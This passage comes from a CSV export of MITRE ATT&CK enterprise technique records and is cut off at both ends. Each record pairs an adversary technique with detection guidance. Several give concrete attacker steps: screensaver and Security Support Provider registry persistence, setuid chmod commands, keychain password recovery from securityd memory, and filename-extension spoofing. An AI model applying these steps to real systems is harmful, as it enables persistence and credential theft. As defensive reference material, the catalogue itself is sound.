'Windows event logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire', 'Leo Loobeek, @leoloobeek']","['Administrator', 'SYSTEM']","","True","",""
"attack-pattern","attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466","2017-05-31T21:30:34.139Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Scheduled Transfer","Data exfiltration may be performed only at certain times of day or at certain intervals.  This could be done to blend traffic patterns with normal activity or availability.

When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.

Detection: Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.

Platforms: Linux, macOS, Windows

Data Sources: Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1029', 'external_id': 'T1029'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688","2017-05-31T21:31:25.060Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Screen Capture","Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

===Mac===

On OSX, the native command `screencapture` is used to capture screenshots.

===Linux===

On Linux, there is the native command `xwd`. (Citation: Antiquated Mac Malware)

Detection: Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Process monitoring, File monitoring","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1113', 'external_id': 'T1113'}, {'source_name': 'Antiquated Mac Malware', 'description': 'Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process monitoring', 'File monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Screensaver","Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. (Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.exe is located in `C:\Windows\System32\` along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (`HKCU\Control Panel\Desktop\`) and could be manipulated to achieve persistence:

*`SCRNSAVE.exe` - set to malicious PE path
*`ScreenSaveActive` - set to '1' to enable the screensaver
*`ScreenSaverIsSecure` - set to '0' to not require a password to unlock
*`ScreenSaverTimeout` - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)

Detection: Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.

Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.

Platforms: Windows

Data Sources: Process Monitoring, Process command-line parameters, Windows Registry, File monitoring

Permissions Required: User

Contributors: Bartosz Jerzman","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1180', 'external_id': 'T1180'}, {'source_name': 'Wikipedia Screensaver', 'description': 'Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.', 'url': 'https://en.wikipedia.org/wiki/Screensaver'}, {'source_name': 'ESET Gazer Aug 2017', 'description': 'ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.', 'url': 'https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'Process command-line parameters', 'Windows Registry', 'File monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Bartosz Jerzman']","","","","",""
"attack-pattern","attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44","2017-05-31T21:30:51.733Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Scripting","Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike.  (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

Detection: Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

Platforms: Linux, macOS, Windows

Data Sources: Process monitoring, File monitoring, Process command-line parameters

Defense Bypassed: Process whitelisting","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1064', 'external_id': 'T1064'}, {'source_name': 'Metasploit', 'description': 'Metasploit. (n.d.).  Retrieved December 4, 2014.', 'url': 'http://www.metasploit.com'}, {'source_name': 'Veil', 'description': 'Veil Framework. (n.d.).  Retrieved December 4, 2014.', 'url': 'https://www.veil-framework.com/framework/'}, {'source_name': 'Powersploit', 'description': 'PowerSploit. (n.d.).  Retrieved December 4, 2014.', 'url': 'https://github.com/mattifestation/PowerSploit'}, {'source_name': 'Alperovitch 2014', 'description': 'Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014.', 'url': 'https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'File monitoring', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Process whitelisting']"
"attack-pattern","attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7","2017-05-31T21:30:51.330Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Security Software Discovery","Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.

===Windows===

Example commands that can be used to obtain security software information are netsh, `reg query` with Reg, `dir` with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

===Mac===

It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: macOS, Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1063', 'external_id': 'T1063'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446","2017-05-31T21:31:13.447Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Security Support Provider","Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` and `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
 (Citation: Graeber 2014)

Detection: Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe` with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)

Platforms: Windows

Data Sources: DLL monitoring, Windows Registry, Loaded DLLs

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1101', 'external_id': 'T1101'}, {'source_name': 'Graeber 2014', 'description': 'Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.', 'url': 'http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html'}, {'source_name': 'Microsoft Configure LSA', 'description': 'Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.', 'url': 'https://technet.microsoft.com/en-us/library/dn408187.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['DLL monitoring', 'Windows Registry', 'Loaded DLLs']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Securityd Memory","In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)

If an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)

Platforms: macOS

Data Sources: Process Monitoring

Permissions Required: root","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1167', 'external_id': 'T1167'}, {'source_name': 'OS X Keychain', 'description': 'Juuso Salonen. (2012, September 5). Breaking into the OS X keychain. Retrieved July 15, 2017.', 'url': 'http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain'}, {'source_name': 'External to DA, the OS X Way', 'description': 'Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.', 'url': 'http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way'}, {'source_name': 'OSX Keydnap malware', 'description': 'Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.', 'url': 'https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring']","['root']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392","2017-05-31T21:30:36.550Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Service Execution","Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.

Detection: Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool PsExec.

Platforms: Windows

Data Sources: Windows Registry, Process command-line parameters, Process monitoring

Permissions Required: Administrator, SYSTEM

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1035', 'external_id': 'T1035'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Process command-line parameters', 'Process monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","True","",""
"attack-pattern","attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427","2017-05-31T21:30:49.119Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Service Registry Permissions Weakness","Windows stores local service configuration information in the Registry under `HKLM\SYSTEM\CurrentControlSet\Services`. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Detection: Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path is changed to a location that is not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

Platforms: Windows

Data Sources: Process command-line parameters, Services, Windows Registry

Effective Permissions: SYSTEM

Permissions Required: Administrator, SYSTEM

System Requirements: Ability to modify a service binPath/ImagePath value in the Registry

Contributors: Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1058', 'external_id': 'T1058'}, {'source_name': 'MSDN Registry Key Security', 'description': 'Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved March 16, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Services', 'Windows Registry']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire']","['SYSTEM']","['Ability to modify a service binPath/ImagePath value in the Registry']","","",""
"attack-pattern","attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Setuid and Setgid","When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via `ls -l`. The `chmod` program can set these bits with via bitmasking, `chmod 4777 [file]` or via shorthand naming, `chmod u+s [file]`.

An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context.

Detection: Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Effective Permissions: Administrator, root

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1166', 'external_id': 'T1166'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['Administrator', 'root']","","","",""
"attack-pattern","attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db","2017-05-31T21:30:46.047Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Shared Webroot","Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.

This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited.

Detection: Use file and process monitoring to detect when files are written to a Web server by a process that is not the normal Web server process or when files are written outside of normal administrative time periods. Use process monitoring to identify normal processes that run on the Web server and detect processes that are not typically executed.

Platforms: Windows

Data Sources: File monitoring, Process monitoring

System Requirements: Shared webroot directory on remote system","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1051', 'external_id': 'T1051'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Shared webroot directory on remote system']","","",""
"attack-pattern","attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810","2017-05-31T21:30:30.757Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Shortcut Modification","Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.

Detection: Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.

Platforms: Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator

Contributors: Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1023', 'external_id': 'T1023'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire']","","","","",""
"attack-pattern","attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88","2017-05-31T21:30:43.472Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Software Packing","Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

Detection: Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.

Platforms: Windows

Data Sources: Binary file metadata

Defense Bypassed: Anti-virus, heuristic detection, Signature-based detection","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1045', 'external_id': 'T1045'}, {'source_name': 'Wikipedia Exe Compression', 'description': 'Executable compression. (n.d.).  Retrieved December 4, 2014.', 'url': 'http://en.wikipedia.org/wiki/Executable%20compression'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'heuristic detection', 'Signature-based detection']"
"attack-pattern","attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Source","The `source` command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways `source /path/to/filename [arguments]` or `. /path/to/filename [arguments]`. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. 

Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.

Detection: Monitor for command shell execution of source and subsequent processes that are started as a result of being executed by a source command. Adversaries must also drop a file to disk in order to execute it with source, and these files can also detected by file monitoring.

Platforms: Linux, macOS

Data Sources: Process Monitoring, File monitoring, Process command-line parameters

Permissions Required: User

Remote Support: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1153', 'external_id': 'T1153'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'File monitoring', 'Process command-line parameters']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","False","",""
"attack-pattern","attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Space after Filename","Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to ""evil.txt "" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). 

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.

Detection: It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring

Permissions Required: User

Contributors: Erye Hernandez, Palo Alto Networks","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1151', 'external_id': 'T1151'}, {'source_name': 'Mac Backdoors are back', 'description': 'Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors are suddenly back. Retrieved July 8, 2017.', 'url': 'https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Erye Hernandez, Palo Alto Networks']","","","","",""
"attack-pattern","attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6","2017-05-31T21:30:56.776Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Standard Application Layer Protocol","Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1071', 'external_id': 'T1071'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5","2017-05-31T21:30:35.334Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Standard Cryptographic Protocol","Adversaries use command and control over an encrypted channel using a known encryption protocol like HTTPS or SSL/TLS. The use of strong encryption makes it difficult for defenders to detect signatures within adversary command and control traffic.

Some adversaries may use other encryption protocols and algorithms with symmetric keys, such as RC4, that rely on encryption keys encoded into malware configuration files and not public key cryptography. Such keys may be obtained through malware reverse engineering.

